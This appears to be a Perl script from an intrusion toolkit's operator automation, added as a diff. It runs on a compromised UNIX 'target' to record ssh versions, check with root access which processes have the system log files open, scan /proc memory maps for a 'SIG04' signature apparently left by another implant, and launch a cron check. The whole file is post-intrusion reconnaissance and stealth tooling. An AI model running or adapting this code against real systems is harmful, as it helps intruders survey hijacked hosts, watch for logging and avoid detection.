@@ -1,0 +1,177 @@
+#!/usr/bin/env perl
+#
+# 20130416 - This portion of autonewdone implements all of the target software discovery
+# that needs to be performed when first connecting to a UNIX target.
+#
+$VER="3.0.0.5";
+$ext = $$ ;			# limits likelihood of concurrent autodone's colliding
+				# BUT: still possible.
+				# not too likely to happen.
+
+$| = 1;
+myinit() ;
+
+sub doswfind() {
+  # Instead of blindly running ssh, check for it first.
+  ($sshoutput,$nopenlines,@sshoutput) = nopenlss("-UFP","ssh*");
+  my $path = "";
+  my $daemon = "";
+  if ($sshoutput[-1]) {
+    # We got at least one filename.
+    foreach $filelisting (@sshoutput) {
+      # Get the path to each ssh binary, then run it individually.
+      # This will let us check the versions of multiple ssh binaries
+      # on the target, if so installed.
+      ($path) = grep m, /.*/ssh\S?$, , $filelisting;
+      if ($path =~ /-.*\s(\/.*\/ssh\S?)$/) {
+        my $path2 = $1;
+        #dbg("in autonewdone swfind, path=$path= path2=$path2=");
+        if ($path2 =~ /sshd/) {
+          $daemon = "SSHD";
+        }
+        else {
+          $daemon = "SSH";
+        }
+        ($output) = doitwrite("$path2 -V") if $path2;
+        chomp($output);
+        if ($output =~ /illegal option/ or $output =~ /usage/) {
+          # Split the output and look for the second line.
+          @sshoutput = split(/\n+/,$output);
+          print HOSTINFO "$daemon version: @sshoutput[1]\n";
+        }
+        else {
+          print HOSTINFO "$daemon version: $output\n";
+        }
+        ($output) = ();
+      }
+    }
+  } else {
+    myalert("NOLOGGING","No SSH binaries found, skipping ssh -V command");
+  }
+
+  my ($uid) = doitwrite("id");
+
+  # This stuff only do if we are root
+  if ($uid =~ /uid=0\D/) {
+    if ($solaristarget) {
+      my @pfilepids = ();
+
+      my (undef,undef,@inodeoutput) = doit("-ls -di /proc/*/fd/*");
+      my ($openfilesoutput,$badprocs) = ();
+      my @checklogfiles = ("/var/adm/messages","/var/log/syslog");
+      foreach my $logfile (@checklogfiles) {
+        my ($inode) = doit("-ls -i $logfile");
+        ($inode) = $inode =~ /^\s*(\d+)\s/;
+        if (my @greppedinodeoutput = grep /^\s*$inode\s/ , @inodeoutput) {
+          my @pids = ();
+          foreach (@greppedinodeoutput) {
+            push (@pids,$1) if (m,proc/(\d+)/, and $1 > 1);
+          }
+          @pfilepids = uniqify_array(@pids,@pfilepids);
+          my $pids = join("|",@pids);
+          next unless $pids;
+          my ($logprocs,undef,@logprocs) = doit("=ps | egrep \" ($pids) \"");
+          $openfilesoutput .= $COLOR_NOTE.
+          "\n=============================================================\n".
+          $COLOR_NORMAL.
+          "NOTE: These /proc/ entries:\n\n".
+          join("  \n",@greppedinodeoutput)."\n\n".
+          "indicate that these processes have $logfile open:\n\n".
+          $logprocs;
+          $badprocs++ if (grep ! /(syslog|syslogd)$/ , @logprocs);
+        }
+      }
+      doit("pfiles @pfilepids");
+      if ($openfilesoutput) {
+        progprint($openfilesoutput."\n\n".
+                  "See above for output from \"pfiles @pfilepids\".".
+                  "");
+        if ($badprocs) {
+          if ($nopromptsplease) {
+            progprint ($COLOR_FAILURE."\n\n".
+                       "NOTE: There is a process other than syslog or syslogd that has one\n".
+                       "of these files open, SEE ABOVE then continue autonewdone:\n\n   ".
+                       join("\n   ",@checklogfiles)."\n\n".
+                       "PAUSING 5 SECONDS ONLY NO PROMPT...".
+                       "");
+            sleep 5;
+          } else {
+            mygetinput ($COLOR_FAILURE."\n\n".
+                        "NOTE: There is a process other than syslog or syslogd that has one\n".
+                        "of these files open, SEE ABOVE then continue autonewdone:\n\n   ".
+                        join("\n   ",@checklogfiles)."\n\n".
+                        "Hit Return to continue...".
+                        "");
+          }
+        } else {
+          sleep 5;
+        }
+      }
+    } elsif ($linuxtarget) {
+    }
+
+    # For this /proc/*/maps we look everywhere, process it where it exists
+    my ($mapsoutput,$mapsoutputfile) = doitwrite("ARRAY","more /proc/[0-9]*/maps");
+    my @mapsoutput = readfile("ARRAY",$mapsoutputfile);
+    if (@mapsoutput > 3) {
+      my ($gdmoutput,undef,@gdmoutput) = doit("-ls /tmp/.gdm-*");
+      my @mapsbadhits = grep m,libc[sm][12].so, , @mapsoutput;
+      if (@mapsbadhits) {
+        my $gdmmore = $gdmoutput ? "$COLOR_FAILURE   AND THESE ARE LIKELY RELATED ALSO:$COLOR_NORMAL\n\n     ".
+          join("\n     ",@gdmoutput)."\n\n" : "" ;
+        offerabort($COLOR_FAILURE."\n\n   WARNING: $COLOR_NOTE SIG04$COLOR_FAILURE HITS IN /proc/*/maps\n\n$COLOR_NORMAL".
+                   `ls -al $mapsoutputfile`."\n\n".
+                   $gdmmore.
+                   "ALERT: The output in the above local file matches the alert string:\n".
+                   "   /libc[sm][12].so/\n\n".
+                   "You can likely CONTINUE but should take note of this and\n".
+                   "perhaps also alert others about it. File above just popped up, FYI. Search for hits with:\n\n".
+                   "     /libc[sm][12].so\n".
+                   "     ?:::::\n".
+                   "     ?.proc.*".
+                   "\n",
+                   "CONTINUE");
+        filepopup($mapsoutputfile,"-bg white -fg red -geometry 152x48");
+      }
+    } else {
+      unlink($mapsoutputfile);
+    }
+  }
+  
+  mydo("autocroncheck","-F");
+  
+  return 1;
+}
+
+doswfind ();
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs newdone.swfind @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs newdone.swfind";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+
+  # Setting $autodone allows any mydo() called functions to know
+  # we are in this mode to populate $opdir/latewarnings*
+  $autodone=1;
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+}#myinit
